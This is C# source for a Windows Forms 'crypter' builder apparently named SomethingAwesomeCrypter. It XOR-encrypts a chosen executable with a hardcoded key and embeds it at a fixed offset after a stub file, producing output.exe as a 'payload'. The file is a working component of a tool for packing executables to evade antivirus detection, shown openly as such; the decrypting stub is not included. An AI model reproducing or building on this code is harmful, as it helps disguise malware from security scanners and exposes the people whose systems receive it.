using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SomethingAwesomeCrypter
{
    public partial class MainMenu : Form
    {
        public MainMenu()
        {
            InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                // This is a simple function to get the path of the file we want to encrypt.
                string filePath = openFileDialog1.FileName;
                textBox1.Text = filePath;
                outputTextBox.Text = System.IO.Path.GetDirectoryName(filePath) + "\\output.exe";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                // This is a simple function to get the path of the stub we want to embed the
                // payload with.
                textBox2.Text = openFileDialog1.FileName;
            }
        }

        private void BtnEncrypt_Click(object sender, EventArgs e)
        {
            int stubPadding = 12000; //This is the byte offset that the stub will start loading
                                     // the encrypted executable from.
            string filePath = textBox1.Text;
            // The whole program in bytes
            byte[] fileBytes         = System.IO.File.ReadAllBytes(filePath);
            byte[] stubFileBytes     = System.IO.File.ReadAllBytes(textBox2.Text);
            byte[] encryptedExeBytes = new byte[fileBytes.Length];
            byte[] finalFileBytes    = new byte[stubPadding + fileBytes.Length];
            // The secret key in bytes
            byte[] secretKey = new byte[] { 0x10, 0x20, 0x92, 0x12, 0x29 };

            // We are making the assumption that the fileBytes length
            // is bigger than the secretkey length.\
            int i = 0;
            foreach (byte b in fileBytes)
            {
                // Mod with the length to prevent overflow
                byte secretByte = secretKey[i% secretKey.Length];
                byte newB = (byte)(b ^ secretByte);

                encryptedExeBytes[i] = newB;

                i++;
            }

            // Prepare the stub by embedding the payload
            for (i = 0; i < stubFileBytes.Length; i++)
            {
                finalFileBytes[i] = stubFileBytes[i];
            }
            for (i = 0; i < encryptedExeBytes.Length; i++)
            {
                finalFileBytes[stubPadding + i] = encryptedExeBytes[i];
            }

            System.IO.File.WriteAllBytes(outputTextBox.Text, finalFileBytes);
            MessageBox.Show("Payload successfully made.");
        }
    }
}
